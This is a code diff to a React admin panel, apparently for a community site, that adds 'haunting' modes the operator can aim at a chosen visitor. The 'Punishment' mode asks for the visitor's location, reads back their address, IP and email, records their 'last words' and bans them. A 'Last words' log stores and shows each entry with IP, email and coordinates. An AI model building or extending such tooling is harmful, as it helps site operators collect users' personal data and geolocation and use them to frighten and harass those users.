@@ -23,7 +23,15 @@ const EFFECTS: EffectName[] = [
 ];
 
 type Visitor = { session_id: string; label: string; kind: string; path: string; last_seen_at: string; ip?: string | null; user_id?: string | null; guest_id?: string | null };
-type Haunt = { id: string; stage: string; origin_path: string | null; target_ip: string | null; created_at: string };
+type Haunt = { id: string; stage: string; mode?: string | null; origin_path: string | null; target_ip: string | null; created_at: string };
+type Confession = { id: string; words: string; label: string | null; ip: string | null; email: string | null; latitude: number | null; longitude: number | null; created_at: string };
+
+const HAUNT_MODES: { id: string; label: string; hint: string }[] = [
+  { id: "full", label: "Full haunting", hint: "Run warning, the hand, the face, forced offline, a ruined site and the final ban." },
+  { id: "peek", label: "One-time peek", hint: "The face leans in from the edge of one page, watches, and vanishes." },
+  { id: "stalker", label: "Face stalker", hint: "The face only. It trails them across pages, creeping closer, then refreshes their page." },
+  { id: "punish", label: "Punishment", hint: "Asks for their location, then reads back their address, IP and email, takes their last words and bans them." },
+];
 
 type Guest = { id: string; name: string; space_tokens: number; banned: boolean; badge: string | null };
 type Promo = { code: string; tokens: number; grants_pro: boolean; lifetime: boolean; badge: string | null };
@@ -46,6 +54,7 @@ export function AdminPanel({ token, onLock }: { token: string; onLock: () => voi
   const display = useAdminData<{ sky_override: string | null; animations_enabled: boolean }>(token, "get_display", 15_000);
   const lobby = useAdminData<{ messages: LobbyRow[] }>(token, "list_lobby", 10_000);
   const haunts = useAdminData<{ haunts: Haunt[] }>(token, "list_haunts", 10_000);
+  const confessions = useAdminData<{ confessions: Confession[] }>(token, "list_confessions", 20_000);
 
 
   const [intensity, setIntensity] = useState(3);
@@ -53,6 +62,8 @@ export function AdminPanel({ token, onLock }: { token: string; onLock: () => voi
   const [popup, setPopup] = useState({ title: "", body: "", link_url: "", link_label: "", minutes: 30 });
   const [shutdown, setShutdown] = useState({ minutes: 10, message: "", confirm_key: "" });
   const [hauntKey, setHauntKey] = useState("");
+  const [hauntMode, setHauntMode] = useState("full");
+  const [lobbySay, setLobbySay] = useState("");
 
   const [promo, setPromo] = useState({ code: "", tokens: 1000, grants_pro: false, lifetime: false, badge: "" });
   const [eventDraft, setEventDraft] = useState({ title: "", description: "", location: "", starts_at: "", redirect_url: "", emoji: "" });
@@ -194,6 +205,17 @@ export function AdminPanel({ token, onLock }: { token: string; onLock: () => voi
           onChange={(e) => setHauntKey(e.target.value)}
         />
 
+        <div className="mt-3 flex flex-wrap gap-2">
+          {HAUNT_MODES.map((m) => (
+            <Button key={m.id} size="sm" variant={hauntMode === m.id ? "destructive" : "secondary"} onClick={() => setHauntMode(m.id)}>
+              {m.label}
+            </Button>
+          ))}
+        </div>
+        <p className="mt-2 text-xs text-muted-foreground">
+          {HAUNT_MODES.find((m) => m.id === hauntMode)?.hint}
+        </p>
+
         {selected && (
           <p className="mt-3 text-xs text-primary">
             Selected account: {selected.account.username ?? selected.account.name ?? selected.account.id}
@@ -208,8 +230,8 @@ export function AdminPanel({ token, onLock }: { token: string; onLock: () => voi
               void act(
                 "haunt_target",
                 selected?.kind === "member"
-                  ? { user_id: selected.account.id, confirm_key: hauntKey }
-                  : { guest_id: selected?.account.id, confirm_key: hauntKey },
+                  ? { user_id: selected.account.id, confirm_key: hauntKey, mode: hauntMode }
+                  : { guest_id: selected?.account.id, confirm_key: hauntKey, mode: hauntMode },
                 "The tormentor is following that account.",
               )
             }
@@ -235,12 +257,28 @@ export function AdminPanel({ token, onLock }: { token: string; onLock: () => voi
                 onClick={() =>
                   void act(
                     "haunt_target",
-                    { session_id: v.session_id, user_id: v.user_id ?? "", guest_id: v.guest_id ?? "", origin_path: v.path, confirm_key: hauntKey },
+                    { session_id: v.session_id, user_id: v.user_id ?? "", guest_id: v.guest_id ?? "", origin_path: v.path, confirm_key: hauntKey, mode: hauntMode },
                     `The tormentor is following ${v.label}.`,
                   )
                 }
               >
                 Unleash
+              </Button>
+              <Button
+                size="sm"
+                variant="secondary"
+                onClick={() =>
+                  void act(
+                    "create_popup",
+                    { ...popup, target_session_id: v.session_id },
+                    `Private pop-up sent to ${v.label}.`,
+                  )
+                }
+              >
+                Private pop-up
+              </Button>
+              <Button size="sm" variant="ghost" onClick={() => void act("forget_visitor", { session_id: v.session_id }, "Visitor cleared from the board.")}>
+                Forget
               </Button>
             </div>
           ))}
@@ -254,7 +292,7 @@ export function AdminPanel({ token, onLock }: { token: string; onLock: () => voi
           {(haunts.data?.haunts ?? []).map((h) => (
             <div key={h.id} className="flex items-center justify-between gap-2 rounded-md bg-secondary/40 p-2 text-xs">
               <span>
-                {h.stage} · started at {h.origin_path ?? "unknown page"}
+                {h.mode ?? "full"} · {h.stage} · started at {h.origin_path ?? "unknown page"}
               </span>
               <Button size="sm" variant="ghost" onClick={() => void act("haunt_clear", { id: h.id }, "Haunting called off.")}>
                 Stop
@@ -264,6 +302,52 @@ export function AdminPanel({ token, onLock }: { token: string; onLock: () => voi
           {(haunts.data?.haunts ?? []).length === 0 && (
             <p className="text-sm text-muted-foreground">Nobody is being haunted.</p>
           )}
+        </div>
+      </section>
+
+      <section className="glass-panel p-5">
+        <h2 className="text-lg font-semibold">Last words</h2>
+        <p className="mt-1 text-xs text-muted-foreground">Everything submitted at the end of a punishment.</p>
+        <div className="mt-3 max-h-72 space-y-2 overflow-y-auto">
+          {(confessions.data?.confessions ?? []).map((c) => (
+            <div key={c.id} className="rounded-md bg-secondary/40 p-3 text-sm">
+              <div className="flex items-start justify-between gap-2">
+                <strong>{c.label ?? "Unknown"}</strong>
+                <Button size="sm" variant="ghost" onClick={() => void act("delete_confession", { id: c.id }, "Entry deleted.")}>Delete</Button>
+              </div>
+              <p className="mt-1">{c.words}</p>
+              <p className="mt-1 text-xs text-muted-foreground">
+                {new Date(c.created_at).toLocaleString()}
+                {c.ip ? ` · ${c.ip}` : ""}
+                {c.email ? ` · ${c.email}` : ""}
+                {c.latitude != null && c.longitude != null ? ` · ${c.latitude.toFixed(4)}, ${c.longitude.toFixed(4)}` : ""}
+              </p>
+            </div>
+          ))}
+          {(confessions.data?.confessions ?? []).length === 0 && (
+            <p className="text-sm text-muted-foreground">Nobody has confessed yet.</p>
+          )}
+        </div>
+        <Button size="sm" variant="destructive" className="mt-3" onClick={() => void act("clear_confessions", {}, "All entries cleared.")}>Clear all</Button>
+      </section>
+
+      <section className="glass-panel p-5">
+        <h2 className="text-lg font-semibold">Quick tools</h2>
+        <div className="mt-3 flex gap-2">
+          <Input placeholder="Speak in the lobby as mission control" value={lobbySay} onChange={(e) => setLobbySay(e.target.value)} />
+          <Button size="sm" onClick={() => void act("send_lobby_message", { content: lobbySay }, "Message posted.").then(() => setLobbySay(""))}>Post</Button>
+        </div>
+        <div className="mt-3 flex flex-wrap gap-2">
+          {selected?.kind === "member" && (
+            <>
+              <Button size="sm" variant="secondary" onClick={() => void act("set_pro", { user_id: selected.account.id, is_pro: true }, "Pro granted.")}>Grant Pro</Button>
+              <Button size="sm" variant="secondary" onClick={() => void act("set_pro", { user_id: selected.account.id, is_pro: false }, "Pro removed.")}>Remove Pro</Button>
+            </>
+          )}
+          {selected && (
+            <Button size="sm" variant="secondary" onClick={() => void act("set_badge", { [`${selected.kind === "member" ? "user" : "guest"}_id`]: selected.account.id, badge: "haunted" }, "Badge set.")}>Mark as haunted</Button>
+          )}
+          <Button size="sm" variant="destructive" onClick={() => void act("unban_everyone", {}, "Everyone unbanned.")}>Unban everyone</Button>
         </div>
       </section>
 
